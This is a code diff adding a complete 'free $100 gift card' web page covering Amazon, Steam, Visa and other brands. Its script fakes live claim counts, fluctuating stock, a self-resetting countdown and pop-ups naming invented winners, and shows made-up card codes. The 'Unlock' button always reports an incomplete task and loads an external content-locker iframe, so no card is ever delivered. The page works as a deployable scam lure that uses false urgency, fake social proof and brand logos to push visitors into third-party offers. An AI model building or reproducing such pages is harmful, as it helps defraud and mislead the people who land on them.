+        <div class="bg-orb"></div>
+        <div class="bg-grid"></div>
+    </div>
+
+    <div class="particles-container" id="particlesContainer"></div>
+
+    <div class="main-wrapper">
+
+        <section class="hero-section">
+            <div class="hero-badge">
+                <span class="live-dot"></span>
+                <span><span id="liveCount">2,847</span> people claiming right now</span>
+            </div>
+            <h1 class="hero-title">
+                Claim Your <span class="gradient-text">FREE $100</span><br>Gift Card Today
+            </h1>
+            <p class="hero-subtitle">
+                Choose from top brands below. Limited cards available per day – claim yours before stock runs out!
+            </p>
+        </section>
+
+        <div class="stats-bar">
+            <div class="stat-chip"><i class="fas fa-shield-halved green"></i><span>Verified Offers</span></div>
+            <div class="stat-chip"><i class="fas fa-lock gold"></i><span>Secure & Safe</span></div>
+            <div class="stat-chip"><i class="fas fa-check-double blue"></i><span>100% Legitimate</span></div>
+            <div class="stat-chip"><i class="fas fa-users green"></i><span id="totalClaimed">12,847</span>&nbsp;Claimed</div>
+        </div>
+
+        <div class="timer-section">
+            <div class="timer-label"><i class="fas fa-clock"></i><span>Offer Expires In</span></div>
+            <div class="countdown-grid">
+                <div class="countdown-block">
+                    <div class="cd-number" id="cdHours">12</div>
+                    <div class="cd-label">Hours</div>
+                </div>
+                <div class="countdown-separator">:</div>
+                <div class="countdown-block">
+                    <div class="cd-number" id="cdMinutes">00</div>
+                    <div class="cd-label">Min</div>
+                </div>
+                <div class="countdown-separator">:</div>
+                <div class="countdown-block">
+                    <div class="cd-number" id="cdSeconds">00</div>
+                    <div class="cd-label">Sec</div>
+                </div>
+            </div>
+        </div>
+
+        <section class="grid-section">
+            <div class="card-grid" id="cardGrid"></div>
+        </section>
+
+    </div>
+
+    <div class="page-footer">
+        <p class="footer-text">
+            © 2026 Gift Card Rewards. All rights reserved.<br>
+            All trademarks and logos belong to their respective owners.<br>
+            This is a promotional offer site.
+        </p>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal-backdrop" id="modalBackdrop">
+        <div class="modal-box">
+            <button class="modal-close-btn" onclick="closeModal()" aria-label="Close"><i class="fas fa-xmark"></i></button>
+            <div class="modal-icon-wrap">
+                <div class="modal-icon-ring"></div>
+                <div class="modal-icon-box" id="modalIconBox"></div>
+            </div>
+            <h2 class="modal-card-title" id="modalTitle"></h2>
+            <div class="modal-card-amount">$100 FREE</div>
+            <p class="modal-card-subtitle">Gift Card Code Generated Successfully</p>
+            <div class="code-card">
+                <div class="code-card-label">Your Gift Card Code</div>
+                <div class="code-card-value" id="modalCodeValue"></div>
+                <div class="code-lock-overlay"><i class="fas fa-lock"></i></div>
+            </div>
+            <div class="modal-progress">
+                <div class="modal-progress-bar">
+                    <div class="modal-progress-fill"></div>
+                </div>
+                <div class="modal-progress-text"><i class="fas fa-lock"></i> Complete verification to reveal full code</div>
+            </div>
+            <div class="modal-claimed-row">
+                <div class="avatar-group">
+                    <div class="avatar-circle">JD</div>
+                    <div class="avatar-circle">SK</div>
+                    <div class="avatar-circle">MR</div>
+                    <div class="avatar-circle">LT</div>
+                    <div class="avatar-circle">99+</div>
+                </div>
+                <span class="claimed-count-text" id="modalClaimedText">2,341 claimed today</span>
+            </div>
+            <button class="unlock-action-btn" onclick="handleUnlock()"><i class="fas fa-unlock-keyhole"></i> Unlock Full Code Now</button>
+            <div class="error-msg" id="errorMsg"><i class="fas fa-triangle-exclamation"></i> Your task is not completed</div>
+            <p class="modal-fine-print"><i class="fas fa-info-circle"></i> Complete a quick verification to prevent abuse and unlock your full gift card code.</p>
+        </div>
+    </div>
+
+    <!-- Content Locker -->
+    <div class="locker-backdrop" id="lockerBackdrop">
+        <div class="locker-frame-wrap">
+            <button class="locker-close-btn" onclick="closeLocker()" aria-label="Close"><i class="fas fa-xmark"></i></button>
+            <iframe src="about:blank" id="lockerIframe" loading="lazy"></iframe>
+        </div>
+    </div>
+
+    <!-- Toasts -->
+    <div class="toast-stack" id="toastStack"></div>
+
+    <script>
+        // ==================== GIFT CARD DATA WITH OFFICIAL LOGOS ====================
+        const giftCards = [
+            {
+                name: "Amazon",
+                fullCode: "A7F3-K9P2-X6L8-M4G1",
+                masked: "XXXX-XXXX-XXXX-M4G1",
+                stock: 99,
+                color: "#FF9900",
+                logoBg: "#FF9900",
+                // Official Amazon logo
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/amazon-512.png",
+                fallbackIcon: "fab fa-amazon",
+                fallbackColor: "#FF9900",
+                fallbackBg: "linear-gradient(135deg, #232F3E, #37475A)"
+            },
+            {
+                name: "eBay",
+                fullCode: "X6Q3-L9K2-P4M7-R8H2",
+                masked: "XXXX-XXXX-XXXX-R8H2",
+                stock: 88,
+                color: "#E53238",
+                logoBg: "#E53238",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/ebay-512.png",
+                fallbackIcon: "fab fa-ebay",
+                fallbackColor: "#E53238",
+                fallbackBg: "linear-gradient(135deg, #fff, #f5f5f5)"
+            },
+            {
+                name: "Walmart",
+                fullCode: "R4X7-K9M2-P6Q3-L8J3",
+                masked: "XXXX-XXXX-XXXX-L8J3",
+                stock: 44,
+                color: "#0071CE",
+                logoBg: "#0071CE",
+                logo: "https://cdn.worldvectorlogo.com/logos/walmart.svg",
+                fallbackIcon: "fas fa-store",
+                fallbackColor: "#0071CE",
+                fallbackBg: "linear-gradient(135deg, #0071CE, #004F9A)"
+            },
+            {
+                name: "Target",
+                fullCode: "X2L9-M4K7-P8Q3-R6K4",
+                masked: "XXXX-XXXX-XXXX-R6K4",
+                stock: 66,
+                color: "#CC0000",
+                logoBg: "#CC0000",
+                logo: "https://cdn.worldvectorlogo.com/logos/target-1.svg",
+                fallbackIcon: "fas fa-bullseye",
+                fallbackColor: "#CC0000",
+                fallbackBg: "linear-gradient(135deg, #CC0000, #990000)"
+            },
+            {
+                name: "Best Buy",
+                fullCode: "M9X2-K4P7-R3L8-Q6L5",
+                masked: "XXXX-XXXX-XXXX-Q6L5",
+                stock: 12,
+                color: "#0046BE",
+                logoBg: "#0046BE",
+                logo: "https://cdn.worldvectorlogo.com/logos/best-buy-2.svg",
+                fallbackIcon: "fas fa-tag",
+                fallbackColor: "#FFE000",
+                fallbackBg: "linear-gradient(135deg, #0046BE, #003399)"
+            },
+            {
+                name: "Apple",
+                fullCode: "K7X3-M9P2-R4L8-Q6M6",
+                masked: "XXXX-XXXX-XXXX-Q6M6",
+                stock: 65,
+                color: "#555555",
+                logoBg: "#000000",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/apple-512.png",
+                fallbackIcon: "fab fa-apple",
+                fallbackColor: "#fff",
+                fallbackBg: "linear-gradient(135deg, #1a1a1a, #333)"
+            },
+            {
+                name: "Google Play",
+                fullCode: "M8K3-X9P2-R6L4-Q7N7",
+                masked: "XXXX-XXXX-XXXX-Q7N7",
+                stock: 53,
+                color: "#01875F",
+                logoBg: "#01875F",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/google_play-512.png",
+                fallbackIcon: "fab fa-google-play",
+                fallbackColor: "#01875F",
+                fallbackBg: "linear-gradient(135deg, #E8F5E9, #C8E6C9)"
+            },
+            {
+                name: "Steam",
+                fullCode: "M7X3-K9P2-R4L6-Q8P8",
+                masked: "XXXX-XXXX-XXXX-Q8P8",
+                stock: 37,
+                color: "#1B2838",
+                logoBg: "#1B2838",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/steam-512.png",
+                fallbackIcon: "fab fa-steam",
+                fallbackColor: "#fff",
+                fallbackBg: "linear-gradient(135deg, #1B2838, #2a475e)"
+            },
+            {
+                name: "Roblox",
+                fullCode: "X4K9-P7M2-R6L3-Q8Q9",
+                masked: "XXXX-XXXX-XXXX-Q8Q9",
+                stock: 71,
+                color: "#E2231A",
+                logoBg: "#E2231A",
+                logo: "https://cdn.worldvectorlogo.com/logos/roblox-1.svg",
+                fallbackIcon: "fas fa-gamepad",
+                fallbackColor: "#fff",
+                fallbackBg: "linear-gradient(135deg, #E2231A, #b71c1c)"
+            },
+            {
+                name: "PlayStation",
+                fullCode: "4938-7621-9054-1847",
+                masked: "XXXX-XXXX-XXXX-1847",
+                stock: 29,
+                color: "#003087",
+                logoBg: "#003087",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/playstation-512.png",
+                fallbackIcon: "fab fa-playstation",
+                fallbackColor: "#fff",
+                fallbackBg: "linear-gradient(135deg, #003087, #00439c)"
+            },
+            {
+                name: "Xbox",
+                fullCode: "M6P3-X9K2-R7L4-Q8S2",
+                masked: "XXXX-XXXX-XXXX-Q8S2",
+                stock: 45,
+                color: "#107C10",
+                logoBg: "#107C10",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/xbox-512.png",
+                fallbackIcon: "fab fa-xbox",
+                fallbackColor: "#fff",
+                fallbackBg: "linear-gradient(135deg, #107C10, #1a9f1a)"
+            },
+            {
+                name: "Netflix",
+                fullCode: "X9M2-K7P3-R6L4-Q8T3",
+                masked: "XXXX-XXXX-XXXX-Q8T3",
+                stock: 58,
+                color: "#E50914",
+                logoBg: "#E50914",
+                logo: "https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/227_Netflix_logo-512.png",
+                fallbackIcon: "fas fa-film",
+                fallbackColor: "#E50914",
+                fallbackBg: "linear-gradient(135deg, #000, #1a1a1a)"
+            },
+            {
+                name: "Spotify",
+                fullCode: "M7P2-K9X3-R6L4-Q8U4",
+                masked: "XXXX-XXXX-XXXX-Q8U4",
+                stock: 82,
+                color: "#1DB954",
+                logoBg: "#1DB954",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/spotify-512.png",
+                fallbackIcon: "fab fa-spotify",
+                fallbackColor: "#1DB954",
+                fallbackBg: "linear-gradient(135deg, #191414, #282828)"
+            },
+            {
+                name: "Visa",
+                fullCode: "4839-7612-9054-1847",
+                masked: "XXXX-XXXX-XXXX-1847",
+                stock: 19,
+                color: "#1A1F71",
+                logoBg: "#1A1F71",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/visa-512.png",
+                fallbackIcon: "fab fa-cc-visa",
+                fallbackColor: "#1A1F71",
+                fallbackBg: "linear-gradient(135deg, #fff, #E8EAF6)"
+            },
+            {
+                name: "Mastercard",
+                fullCode: "5284-7391-6402-9157",
+                masked: "XXXX-XXXX-XXXX-9157",
+                stock: 33,
+                color: "#EB001B",
+                logoBg: "#EB001B",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/mastercard-512.png",
+                fallbackIcon: "fab fa-cc-mastercard",
+                fallbackColor: "#EB001B",
+                fallbackBg: "linear-gradient(135deg, #1a1a2e, #2d2d44)"
+            },
+            {
+                name: "American Express",
+                fullCode: "3714-9201-8364-015",
+                masked: "XXXX-XXXX-XXXX-015",
+                stock: 41,
+                color: "#006FCF",
+                logoBg: "#006FCF",
+                logo: "https://cdn4.iconfinder.com/data/icons/flat-brand-logo-2/512/amex-512.png",
+                fallbackIcon: "fab fa-cc-amex",
+                fallbackColor: "#fff",
+                fallbackBg: "linear-gradient(135deg, #006FCF, #0056a0)"
+            }
+        ];
+
+        const notifications = [
+            {n:"John D.",o:"Amazon"},{n:"Sarah K.",o:"eBay"},{n:"Michael R.",o:"Walmart"},
+            {n:"Jessica T.",o:"Target"},{n:"David W.",o:"Best Buy"},{n:"Amanda L.",o:"Amazon"},
+            {n:"Robert P.",o:"eBay"},{n:"Jennifer H.",o:"Walmart"},{n:"Christopher M.",o:"Target"},
+            {n:"Lisa R.",o:"Best Buy"},{n:"Daniel C.",o:"Amazon"},{n:"Patricia S.",o:"eBay"},
+            {n:"Thomas B.",o:"Walmart"},{n:"Nancy K.",o:"Target"},{n:"Charles J.",o:"Best Buy"},
+            {n:"Karen L.",o:"Amazon"},{n:"Steven G.",o:"eBay"},{n:"Betty F.",o:"Walmart"},
+            {n:"Paul D.",o:"Target"},{n:"Dorothy H.",o:"Best Buy"},{n:"Michelle K.",o:"Apple"},
+            {n:"Jason T.",o:"Google Play"},{n:"Emily R.",o:"Apple"},{n:"Brian S.",o:"Google Play"},
+            {n:"Laura M.",o:"Apple"},{n:"Kevin P.",o:"Google Play"},{n:"Amy C.",o:"Apple"},
+            {n:"Eric B.",o:"Google Play"},{n:"Maria L.",o:"Apple"},{n:"Scott W.",o:"Google Play"},
+            {n:"Rebecca J.",o:"Apple"},{n:"Gregory H.",o:"Google Play"},{n:"Stephanie F.",o:"Apple"},
+            {n:"Lawrence T.",o:"Google Play"},{n:"Carolyn D.",o:"Apple"},{n:"Russell N.",o:"Google Play"},
+            {n:"Janice R.",o:"Apple"},{n:"Philip S.",o:"Google Play"},{n:"Christine M.",o:"Apple"},
+            {n:"Randy P.",o:"Google Play"},{n:"William T.",o:"Steam"},{n:"Elizabeth A.",o:"Roblox"},
+            {n:"James L.",o:"PlayStation"},{n:"Mary R.",o:"Xbox"},{n:"Richard H.",o:"Steam"},
+            {n:"Susan M.",o:"Roblox"},{n:"Joseph B.",o:"PlayStation"},{n:"Margaret W.",o:"Xbox"},
+            {n:"Thomas K.",o:"Steam"},{n:"Sandra P.",o:"Roblox"},{n:"Charles D.",o:"PlayStation"},
+            {n:"Linda F.",o:"Xbox"},{n:"Christopher S.",o:"Steam"},{n:"Barbara G.",o:"Roblox"},
+            {n:"Daniel L.",o:"PlayStation"},{n:"Patricia H.",o:"Xbox"},{n:"Matthew C.",o:"Steam"},
+            {n:"Jennifer R.",o:"Roblox"},{n:"Anthony T.",o:"PlayStation"},{n:"Lisa M.",o:"Xbox"},
+            {n:"Mark S.",o:"Netflix"},{n:"Donna P.",o:"Spotify"},{n:"Paul W.",o:"Netflix"},
+            {n:"Carol B.",o:"Spotify"},{n:"Steven H.",o:"Netflix"},{n:"Kimberly F.",o:"Spotify"},
+            {n:"Andrew D.",o:"Netflix"},{n:"Deborah L.",o:"Spotify"},{n:"Joshua R.",o:"Netflix"},
+            {n:"Kathleen T.",o:"Spotify"},{n:"Kenneth C.",o:"Netflix"},{n:"Amy S.",o:"Spotify"},
+            {n:"Edward P.",o:"Netflix"},{n:"Anna M.",o:"Spotify"},{n:"George K.",o:"Netflix"},
+            {n:"Ruth B.",o:"Spotify"},{n:"Brian H.",o:"Netflix"},{n:"Michelle W.",o:"Spotify"},
+            {n:"Ronald L.",o:"Netflix"},{n:"Laura T.",o:"Spotify"},{n:"Kevin M.",o:"Visa"},
+            {n:"Nancy R.",o:"Mastercard"},{n:"Jason P.",o:"American Express"},{n:"Helen S.",o:"Visa"},
+            {n:"Gary D.",o:"Mastercard"},{n:"Betty F.",o:"American Express"},{n:"Larry C.",o:"Visa"},
+            {n:"Karen M.",o:"Mastercard"},{n:"Dennis K.",o:"American Express"},{n:"Cynthia B.",o:"Visa"},
+            {n:"Jerry L.",o:"Mastercard"},{n:"Angela H.",o:"American Express"},{n:"Peter W.",o:"Visa"},
+            {n:"Shirley T.",o:"Mastercard"},{n:"Eugene R.",o:"American Express"},{n:"Gloria P.",o:"Visa"},
+            {n:"Bruce S.",o:"Mastercard"},{n:"Marilyn D.",o:"American Express"},{n:"Ralph C.",o:"Visa"},
+            {n:"Lois B.",o:"Mastercard"}
+        ];
+
+        // ==================== PARTICLES ====================
+        (function createParticles(){
+            const c = document.getElementById('particlesContainer');
+            const colors = ['rgba(255,215,0,0.4)','rgba(139,92,246,0.3)','rgba(59,130,246,0.3)','rgba(255,255,255,0.2)','rgba(255,107,53,0.3)'];
+            for(let i=0;i<40;i++){
+                const p = document.createElement('div');
+                p.className='floating-particle';
+                const size = Math.random()*4+2;
+                p.style.cssText = `width:${size}px;height:${size}px;left:${Math.random()*100}%;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${Math.random()*15+10}s;animation-delay:${Math.random()*15}s;`;
+                c.appendChild(p);
+            }
+        })();
+
+        // ==================== PERSISTENT STOCK ====================
+        function getStocks(){
+            const s = localStorage.getItem('gc_stocks_v3');
+            if(s) return JSON.parse(s);
+            const stocks = {};
+            giftCards.forEach(gc => stocks[gc.name] = gc.stock);
+            localStorage.setItem('gc_stocks_v3', JSON.stringify(stocks));
+            return stocks;
+        }
+
+        let stocks = getStocks();
+
+        function tickStocks(){
+            Object.keys(stocks).forEach(k => {
+                const dir = Math.random() > 0.5 ? -1 : 1;
+                let v = stocks[k] + dir * (Math.floor(Math.random()*3)+1);
+                if(v<3) v = Math.floor(Math.random()*15)+5;
+                if(v>99) v = 92;
+                stocks[k] = v;
+            });
+            localStorage.setItem('gc_stocks_v3', JSON.stringify(stocks));
+            refreshStockUI();
+        }
+
+        function refreshStockUI(){
+            giftCards.forEach((gc,i) => {
+                const v = stocks[gc.name] || gc.stock;
+                const el = document.getElementById(`stk-${i}`);
+                const dot = document.getElementById(`stkdot-${i}`);
+                const bar = document.getElementById(`stkbar-${i}`);
+                if(!el) return;
+                const cls = v < 20 ? 'low' : v < 50 ? 'medium' : 'high';
+                el.textContent = `Only ${v} left!`;
+                el.className = `stock-label ${cls}`;
+                dot.className = `stock-pulse ${cls}`;
+                bar.className = `gc-progress-fill ${cls}`;
+                bar.style.width = `${Math.min(v,100)}%`;
+            });
+        }
+
+        setInterval(tickStocks, 60000);
+
+        // ==================== LOGO RENDERING HELPER ====================
+        function createLogoHTML(gc, size) {
+            const imgId = `logo-img-${gc.name.replace(/\s+/g,'-')}-${size}`;
+            return `
+                <img
+                    id="${imgId}"
+                    src="${gc.logo}"
+                    alt="${gc.name} Official Logo"
+                    style="width:100%;height:100%;object-fit:contain;display:block;padding:12%;"
+                    onerror="handleLogoError(this, '${gc.fallbackIcon}', '${gc.fallbackColor}', '${gc.fallbackBg}')"
+                >
+            `;
+        }
+
+        function handleLogoError(imgEl, icon, color, bg) {
+            const parent = imgEl.parentElement;
+            parent.style.background = bg;
+            parent.innerHTML = `<div class="logo-fallback" style="background:transparent;"><i class="${icon}" style="font-size:1em;color:${color};"></i></div>`;
+        }
+
+        // ==================== RENDER GRID ====================
+        (function renderGrid(){
+            const grid = document.getElementById('cardGrid');
+            giftCards.forEach((gc, i) => {
+                const v = stocks[gc.name] || gc.stock;
+                const cls = v<20?'low':v<50?'medium':'high';
+                const box = document.createElement('div');
+                box.className = 'gc-box';
+                box.setAttribute('role','button');
+                box.setAttribute('tabindex','0');
+                box.setAttribute('aria-label',`Claim ${gc.name} $100 gift card`);
+                box.onclick = () => openModal(i);
+                box.onkeydown = (e) => { if(e.key==='Enter') openModal(i); };
+                box.innerHTML = `
+                    <div class="gc-border-glow"></div>
+                    <div class="gc-inner">
+                        <div class="gc-shine"></div>
+                        <div class="gc-glow-dot"></div>
+                        <div class="gc-logo-wrapper">
+                            <div class="gc-logo-bg" style="background:${gc.logoBg};filter:blur(15px);"></div>
+                            <div class="gc-logo" id="grid-logo-${i}">
+                                ${createLogoHTML(gc, 'grid')}
+                            </div>
+                        </div>
+                        <div class="gc-name">${gc.name}</div>
+                        <div class="gc-type">Gift Card</div>
+                        <div class="gc-amount">$100</div>
+                        <div class="gc-free-badge"><i class="fas fa-check-circle"></i> FREE</div>
+                        <div class="gc-stock-row">
+                            <div class="gc-stock-indicator">
+                                <div class="stock-pulse ${cls}" id="stkdot-${i}"></div>
+                                <span class="stock-label ${cls}" id="stk-${i}">Only ${v} left!</span>
+                            </div>
+                        </div>
+                        <div class="gc-progress">
+                            <div class="gc-progress-fill ${cls}" id="stkbar-${i}" style="width:${Math.min(v,100)}%"></div>
+                        </div>
+                        <button class="gc-claim-btn"><i class="fas fa-gift"></i> Claim Now</button>
+                    </div>
+                `;
+                grid.appendChild(box);
+            });
+        })();
+
+        // ==================== MODAL ====================
+        let activeCardIdx = -1;
+
+        function openModal(idx){
+            activeCardIdx = idx;
+            const gc = giftCards[idx];
+            const iconBox = document.getElementById('modalIconBox');
+            iconBox.innerHTML = createLogoHTML(gc, 'modal');
+
+            document.getElementById('modalTitle').textContent = gc.name + ' Gift Card';
+
+            const parts = gc.masked.split('-');
+            let html = '';
+            parts.forEach((p,i) => {
+                if(p.includes('X')){
+                    html += `<span class="code-hidden">${p}</span>`;
+                } else {
+                    html += `<span class="code-visible">${p}</span>`;
+                }
+                if(i < parts.length - 1) html += `<span class="code-separator"> - </span>`;
+            });
+            document.getElementById('modalCodeValue').innerHTML = html;
+
+            const count = (Math.floor(Math.random()*4000)+1000).toLocaleString();
+            document.getElementById('modalClaimedText').textContent = count + ' claimed today';
+
+            document.getElementById('errorMsg').classList.remove('visible');
+            document.getElementById('modalBackdrop').classList.add('open');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal(){
+            document.getElementById('modalBackdrop').classList.remove('open');
+            document.body.style.overflow = '';
+        }
+
+        function handleUnlock(){
+            const errEl = document.getElementById('errorMsg');
+            errEl.classList.remove('visible');
+            void errEl.offsetWidth;
+            errEl.classList.add('visible');
+
+            setTimeout(() => {
+                const iframe = document.getElementById('lockerIframe');
+                iframe.src = 'https://confirmapp.store/cl/i/1xo2gx';
+                document.getElementById('lockerBackdrop').classList.add('open');
+            }, 900);
+        }
+
+        function closeLocker(){
+            document.getElementById('lockerBackdrop').classList.remove('open');
+            document.getElementById('lockerIframe').src = 'about:blank';
+        }
+
+        document.getElementById('modalBackdrop').addEventListener('click', function(e){
+            if(e.target === this) closeModal();
+        });
+
+        document.getElementById('lockerBackdrop').addEventListener('click', function(e){
+            if(e.target === this) closeLocker();
+        });
+
+        document.addEventListener('keydown', function(e){
+            if(e.key === 'Escape'){
+                if(document.getElementById('lockerBackdrop').classList.contains('open')) closeLocker();
+                else if(document.getElementById('modalBackdrop').classList.contains('open')) closeModal();
+            }
+        });
+
+        // ==================== PERSISTENT COUNTDOWN ====================
+        (function initCountdown(){
+            const KEY = 'gc_cd_end_v3';
+            let end = localStorage.getItem(KEY);
+            if(!end || parseInt(end) <= Date.now()){
+                end = Date.now() + 12*60*60*1000;
+                localStorage.setItem(KEY, end.toString());
+            } else {
+                end = parseInt(end);
+            }
+            function tick(){
+                let diff = end - Date.now();
+                if(diff <= 0){
+                    end = Date.now() + 12*60*60*1000;
+                    localStorage.setItem(KEY, end.toString());
+                    diff = end - Date.now();
+                }
+                const h = Math.floor(diff/3600000);
+                const m = Math.floor((diff%3600000)/60000);
+                const s = Math.floor((diff%60000)/1000);
+                document.getElementById('cdHours').textContent = h.toString().padStart(2,'0');
+                document.getElementById('cdMinutes').textContent = m.toString().padStart(2,'0');
+                document.getElementById('cdSeconds').textContent = s.toString().padStart(2,'0');
+            }
+            tick();
+            setInterval(tick, 1000);
+        })();
+
+        // ==================== NOTIFICATIONS ====================
+        let notifIdx = 0;
+
+        function showToast(){
+            const stack = document.getElementById('toastStack');
+            const n = notifications[notifIdx % notifications.length];
+            const ago = Math.floor(Math.random()*8)+1;
+
+            const toast = document.createElement('div');
+            toast.className = 'toast-item';
+            toast.innerHTML = `
+                <div class="toast-check"><i class="fas fa-check"></i></div>
+                <div class="toast-body">
+                    <p><strong>${n.n}</strong> just claimed <span class="toast-brand">${n.o} $100</span> Gift Card!</p>
+                </div>
+                <div class="toast-time">${ago}m ago</div>
+            `;
+
+            stack.appendChild(toast);
+            notifIdx++;
+
+            while(stack.children.length > 3) stack.removeChild(stack.firstChild);
+
+            setTimeout(() => { if(toast.parentElement) toast.remove(); }, 9000);
+        }
+
+        setTimeout(() => {
+            showToast();
+            setInterval(showToast, 10000);
+        }, 3000);
+
+        // ==================== LIVE COUNT ====================
+        (function(){
+            const el = document.getElementById('liveCount');
+            let val = 2847;
+            setInterval(() => {
+                val += Math.floor(Math.random()*5) - 2;
+                if(val < 2500) val = 2600;
+                if(val > 3500) val = 3200;
+                el.textContent = val.toLocaleString();
+            }, 5000);
+        })();
+
+        // ==================== TOTAL CLAIMED ====================
+        (function(){
+            const el = document.getElementById('totalClaimed');
+            let val = 12847;
+            setInterval(() => {
+                val += Math.floor(Math.random()*4)+1;
+                el.textContent = val.toLocaleString();
+            }, 12000);
+        })();
+
+        // ==================== SCROLL REVEAL ====================
+        (function(){
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if(entry.isIntersecting){
+                        entry.target.style.opacity = '1';
+                        entry.target.style.transform = 'translateY(0)';
+                    }
+                });
+            }, { threshold: 0.1, rootMargin: '0px 0px -30px 0px' });
+
+            setTimeout(() => {
+                document.querySelectorAll('.gc-box').forEach((box, i) => {
+                    box.style.opacity = '0';
+                    box.style.transform = 'translateY(30px)';
+                    box.style.transition = `opacity 0.6s ease ${i*0.05}s, transform 0.6s ease ${i*0.05}s`;
+                    observer.observe(box);
+                });
+            }, 100);
+        })();
+
+        // ==================== HAPTIC FEEDBACK ====================
+        document.querySelectorAll('.gc-claim-btn, .unlock-action-btn').forEach(btn => {
+            btn.addEventListener('touchstart', function(){
+                if(navigator.vibrate) navigator.vibrate(10);
+            }, {passive: true});
+        });
+    </script>
+</body>
+</html>
